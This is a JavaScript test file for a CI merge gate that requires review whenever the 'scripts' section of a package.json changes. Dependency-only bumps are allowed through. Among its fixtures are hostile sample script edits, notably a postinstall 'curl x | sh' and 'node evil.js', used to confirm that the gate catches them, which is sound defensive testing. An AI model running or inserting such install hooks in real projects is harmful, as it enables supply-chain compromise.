// Copyright (c) 2026 Jeffrey Snover. All rights reserved.
// Licensed under the MIT License. See LICENSE file in the project root.

// t/559 (Security p/131#48): package.json and taxonomy-editor/package.json stay unprotected as files (a dependency bump should
// not need the Tech Lead), but their `scripts` decide what `pnpm run lint/test` runs inside required checks. A change under
// `scripts` is a gate change that needs the same --gate-change-review; a dependency-only change is unaffected. One helper
// (scriptsGatePaths) feeds both enqueue-pr.mjs and merge-approval. Unreadable or unparseable on either side counts as a change.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  fetchScriptsGatePaths, gateFileChangeVerdict, packageJsonTargets, scriptsGatePaths, scriptsOfRead,
} from './gate-file-change.mjs';
import { ruleGateFiles, inputProblems } from './merge-approval-verdict.mjs';
import { readScriptsGatePaths } from './merge-approval-run.mjs';

const pj = (obj) => ({ text: JSON.stringify(obj) });
const E = (filename, previous_filename) => ({ filename, ...(previous_filename ? { previous_filename } : {}) });
const decide = (entries, base, head) => scriptsGatePaths({ entries, reads: { base, head } });

const BASE = { name: 'x', scripts: { build: 'tsc', test: 'vitest' }, dependencies: { a: '^1.0.0' } };

test('t/559 deps-only: a dependency change leaves scripts equal, so the file is not a gate change', () => {
  const head = { ...BASE, dependencies: { a: '^1.0.1', b: '^2.0.0' }, devDependencies: { c: '1.0.0' } };
  assert.deepEqual(decide([E('package.json')], { 'package.json': pj(BASE) }, { 'package.json': pj(head) }), []);
  assert.deepEqual(decide([E('taxonomy-editor/package.json')], { 'taxonomy-editor/package.json': pj(BASE) }, { 'taxonomy-editor/package.json': pj(head) }), []);
});

test('t/559 scripts changed: an edited script body, an added script, a removed script, and an emptied scripts block are each a gate change', () => {
  for (const head of [
    { ...BASE, scripts: { ...BASE.scripts, build: 'node evil.js' } },
    { ...BASE, scripts: { ...BASE.scripts, postinstall: 'curl x | sh' } },
    { ...BASE, scripts: { build: 'tsc' } },
    { ...BASE, scripts: {} },
    (({ scripts, ...rest }) => rest)(BASE),
  ]) {
    assert.deepEqual(decide([E('package.json')], { 'package.json': pj(BASE) }, { 'package.json': pj(head) }), ['package.json'], JSON.stringify(head.scripts));
  }
});

test('t/559: scripts added where there were none is a change; no scripts on either side is not; key order alone is not', () => {
  const noScripts = { name: 'x' };
  assert.deepEqual(decide([E('package.json')], { 'package.json': pj(noScripts) }, { 'package.json': pj({ ...noScripts, scripts: { a: 'b' } }) }), ['package.json']);
  assert.deepEqual(decide([E('package.json')], { 'package.json': pj(noScripts) }, { 'package.json': pj({ ...noScripts, version: '1.0.1' }) }), []);
  assert.deepEqual(decide([E('package.json')], { 'package.json': pj({ scripts: { a: '1', b: '2' } }) }, { 'package.json': pj({ scripts: { b: '2', a: '1' } }) }), [], 'key order is not a change');
});

test('t/559 new and deleted files: a new package.json with scripts, or a deleted one that had them, is a change; without scripts it is not', () => {
  assert.deepEqual(decide([E('lib/x/package.json')], { 'lib/x/package.json': { missing: true } }, { 'lib/x/package.json': pj({ scripts: { a: 'b' } }) }), ['lib/x/package.json']);
  assert.deepEqual(decide([E('lib/x/package.json')], { 'lib/x/package.json': { missing: true } }, { 'lib/x/package.json': pj({ name: 'x' }) }), []);
  assert.deepEqual(decide([E('lib/x/package.json')], { 'lib/x/package.json': pj({ scripts: { a: 'b' } }) }, { 'lib/x/package.json': { missing: true } }), ['lib/x/package.json']);
});

test('t/559 read failure (refused): an error, a missing read entry, or unparseable JSON on either side counts as a change', () => {
  const ok = pj(BASE);
  assert.deepEqual(decide([E('package.json')], { 'package.json': { error: new Error('HTTP 502') } }, { 'package.json': ok }), ['package.json'], 'base read failed');
  assert.deepEqual(decide([E('package.json')], { 'package.json': ok }, { 'package.json': { error: new Error('HTTP 502') } }), ['package.json'], 'head read failed');
  assert.deepEqual(decide([E('package.json')], { 'package.json': ok }, {}), ['package.json'], 'no head read at all');
  assert.deepEqual(decide([E('package.json')], {}, { 'package.json': ok }), ['package.json'], 'no base read at all');
  assert.deepEqual(decide([E('package.json')], { 'package.json': { text: '{ not json' } }, { 'package.json': ok }), ['package.json'], 'base does not parse');
  assert.deepEqual(decide([E('package.json')], { 'package.json': ok }, { 'package.json': { text: '[1,2]' } }), ['package.json'], 'head is not an object');
  assert.deepEqual(decide([E('package.json')], { 'package.json': ok }, { 'package.json': { text: '' } }), ['package.json'], 'head is empty');
});

test('t/559: a rename reads the old path at the base; files that are not package.json are never read or counted', () => {
  assert.deepEqual(decide([E('lib/new/package.json', 'lib/old/package.json')], { 'lib/old/package.json': pj(BASE) }, { 'lib/new/package.json': pj(BASE) }), []);
  assert.deepEqual(decide([E('lib/new/package.json', 'lib/old/package.json')], { 'lib/old/package.json': pj(BASE) }, { 'lib/new/package.json': pj({ ...BASE, scripts: {} }) }), ['lib/new/package.json']);
  assert.deepEqual(packageJsonTargets([E('README.md'), E('package.json.bak'), E('a/package-lock.json'), E('x/package.json')]).map((t) => t.path), ['x/package.json']);
  assert.deepEqual(decide([E('docs/a.md')], {}, {}), []);
});

// ── the verdict both callers feed ──

test('t/559 verdict: a scripts change refuses without a review and releases with a valid Tech Lead or Security review; deps-only is allowed', () => {
  const files = { paths: ['package.json'], listedCount: 1, expectedCount: 1 };
  const none = gateFileChangeVerdict({ files, headSha: 'a'.repeat(40), override: null, scriptsPaths: [] });
  assert.equal(none.allow, true);
  assert.equal(none.reason, 'no_gate_files');
  const refused = gateFileChangeVerdict({ files, headSha: 'a'.repeat(40), override: null, scriptsPaths: ['package.json'] });
  assert.equal(refused.allow, false);
  assert.equal(refused.reason, 'gate_files_no_override');
  assert.deepEqual(refused.gateFiles, ['package.json']);
  const review = { id: 9, user: { login: 'interweave-reviewer[bot]' }, state: 'APPROVED', commit_id: 'a'.repeat(40), body: 'Approved (Security): scripts reviewed' };
  const released = gateFileChangeVerdict({ files, headSha: 'a'.repeat(40), override: { review }, scriptsPaths: ['package.json'], reviewerLogin: 'interweave-reviewer[bot]' });
  assert.equal(released.allow, true);
  assert.equal(released.reason, 'gate_files_overridden');
});

const mpr = (over = {}) => ({
  number: 7, headSha: 'a'.repeat(40), body: 'Tier: T1', headRefName: 'devops/x', files: [{ filename: 'package.json' }], filesTruncated: false,
  scriptsGatePaths: [], reviews: [], comments: [], labels: [], ...over,
});

test('t/559 merge-approval: rule A takes the same scripts paths, so a scripts change fails rule A without a review and a deps-only PR passes it', () => {
  assert.equal(ruleGateFiles(mpr()).ok, true);
  const r = ruleGateFiles(mpr({ scriptsGatePaths: ['package.json'] }));
  assert.equal(r.ok, false);
  assert.match(r.detail, /package\.json/);
});

test('t/559 merge-approval: input without scriptsGatePaths is an input problem, never a pass', () => {
  assert.deepEqual(inputProblems(mpr()), []);
  const { scriptsGatePaths: _drop, ...without } = mpr();
  assert.ok(inputProblems(without).includes('scriptsGatePaths'));
});

// ── the two readers, against fakes ──

function ghFake({ scriptsBase, scriptsHead, baseStatus = 'ok', headStatus = 'ok', compare = 'ok' }) {
  const calls = [];
  const fn = (args) => {
    const joined = args.join(' ');
    calls.push(joined);
    if (joined.includes('/compare/')) {
      if (compare !== 'ok') throw new Error('gh: HTTP 500');
      return JSON.stringify({ sha: 'b'.repeat(40) });
    }
    if (joined.includes('/contents/')) {
      const isBase = joined.includes(`ref=${'b'.repeat(40)}`);
      const status = isBase ? baseStatus : headStatus;
      if (status === 'missing') throw Object.assign(new Error('gh: Not Found (HTTP 404)'), { stderr: 'gh: Not Found (HTTP 404)' });
      if (status === 'error') throw new Error('gh: HTTP 502 Bad Gateway');
      return JSON.stringify({ name: 'x', scripts: isBase ? scriptsBase : scriptsHead });
    }
    throw new Error(`unexpected gh call: ${joined}`);
  };
  fn.calls = calls;
  return fn;
}

test('t/559 enqueue-pr reader: deps-only reads and finds nothing; scripts changed is found; nothing is read when no package.json changed', () => {
  const same = ghFake({ scriptsBase: { a: '1' }, scriptsHead: { a: '1' } });
  assert.deepEqual(fetchScriptsGatePaths('o/r', 'main', 'c'.repeat(40), [E('package.json')], same), { paths: [], error: null });
  const changed = ghFake({ scriptsBase: { a: '1' }, scriptsHead: { a: '2' } });
  assert.deepEqual(fetchScriptsGatePaths('o/r', 'main', 'c'.repeat(40), [E('package.json')], changed).paths, ['package.json']);
  const idle = ghFake({});
  assert.deepEqual(fetchScriptsGatePaths('o/r', 'main', 'c'.repeat(40), [E('docs/a.md')], idle), { paths: [], error: null });
  assert.equal(idle.calls.length, 0, 'no API read when no package.json changed');
});

test('t/559 enqueue-pr reader (refused): a 502 on either side, a failed compare, and a head that is missing but had scripts count as a change', () => {
  const sha = 'c'.repeat(40);
  assert.deepEqual(fetchScriptsGatePaths('o/r', 'main', sha, [E('package.json')], ghFake({ headStatus: 'error', scriptsBase: {} })).paths, ['package.json']);
  assert.deepEqual(fetchScriptsGatePaths('o/r', 'main', sha, [E('package.json')], ghFake({ baseStatus: 'error', scriptsHead: {} })).paths, ['package.json']);
  const noCompare = fetchScriptsGatePaths('o/r', 'main', sha, [E('package.json'), E('lib/a/package.json')], ghFake({ compare: 'fail', scriptsBase: {}, scriptsHead: {} }));
  assert.deepEqual(noCompare.paths, ['package.json', 'lib/a/package.json']);
  assert.ok(noCompare.error, 'the failure is reported to the caller for a WARN');
  assert.deepEqual(fetchScriptsGatePaths('o/r', 'main', sha, [E('package.json')], ghFake({ headStatus: 'missing', scriptsBase: { a: '1' } })).paths, ['package.json'], 'deleted, had scripts');
});

function octokitFake({ baseScripts, headScripts, status = {}, compareFails = false }) {
  const calls = [];
  const github = {
    rest: { repos: {
      compareCommitsWithBasehead: async (a) => { calls.push(`compare ${a.basehead}`); if (compareFails) throw Object.assign(new Error('boom'), { status: 500 }); return { data: { merge_base_commit: { sha: 'b'.repeat(40) } } }; },
      getContent: async (a) => {
        calls.push(`content ${a.path}@${a.ref}`);
        const isBase = a.ref === 'b'.repeat(40);
        const st = isBase ? status.base : status.head;
        if (st === 404) throw Object.assign(new Error('Not Found'), { status: 404 });
        if (st === 502) throw Object.assign(new Error('Bad Gateway'), { status: 502 });
        return { data: JSON.stringify({ scripts: isBase ? baseScripts : headScripts }) };
      },
    } },
  };
  github.calls = calls;
  return github;
}
const PR = { base: { ref: 'main' }, head: { sha: 'c'.repeat(40) } };

test('t/559 merge-approval reader: deps-only finds nothing, scripts changed is found, a read failure or failed compare is a change, nothing is read without a package.json', async () => {
  const args = (github) => ({ github, owner: 'o', repo: 'r', pr: PR, files: [E('package.json')] });
  assert.deepEqual(await readScriptsGatePaths(args(octokitFake({ baseScripts: { a: '1' }, headScripts: { a: '1' } }))), []);
  assert.deepEqual(await readScriptsGatePaths(args(octokitFake({ baseScripts: { a: '1' }, headScripts: { a: '2' } }))), ['package.json']);
  assert.deepEqual(await readScriptsGatePaths(args(octokitFake({ baseScripts: {}, headScripts: {}, status: { head: 502 } }))), ['package.json']);
  assert.deepEqual(await readScriptsGatePaths(args(octokitFake({ baseScripts: {}, headScripts: {}, compareFails: true }))), ['package.json']);
  assert.deepEqual(await readScriptsGatePaths(args(octokitFake({ baseScripts: { a: '1' }, headScripts: {}, status: { head: 404 } }))), ['package.json'], 'deleted, had scripts');
  const idle = octokitFake({});
  assert.deepEqual(await readScriptsGatePaths({ github: idle, owner: 'o', repo: 'r', pr: PR, files: [E('src/a.ts')] }), []);
  assert.equal(idle.calls.length, 0);
});

test('t/559: the two readers agree on the same facts (the callers cannot disagree)', async () => {
  for (const [b, h] of [[{ a: '1' }, { a: '1' }], [{ a: '1' }, { a: '2' }], [{ a: '1' }, undefined], [undefined, { a: '1' }], [undefined, undefined]]) {
    const gh = fetchScriptsGatePaths('o/r', 'main', 'c'.repeat(40), [E('package.json')], ghFake({ scriptsBase: b, scriptsHead: h })).paths;
    const ok = await readScriptsGatePaths({ github: octokitFake({ baseScripts: b, headScripts: h }), owner: 'o', repo: 'r', pr: PR, files: [E('package.json')] });
    assert.deepEqual(gh, ok, JSON.stringify([b, h]));
  }
});

test('t/559: scriptsOfRead on its own (missing = no scripts; unreadable = not ok)', () => {
  assert.deepEqual(scriptsOfRead({ missing: true }), { ok: true, scripts: null });
  assert.deepEqual(scriptsOfRead({ text: '{"a":1}' }), { ok: true, scripts: null });
  assert.deepEqual(scriptsOfRead({ text: '{"scripts":{"a":"b"}}' }), { ok: true, scripts: { a: 'b' } });
  for (const bad of [undefined, null, {}, { error: new Error('x') }, { text: 5 }, { text: 'null' }]) assert.equal(scriptsOfRead(bad).ok, false, JSON.stringify(bad));
});
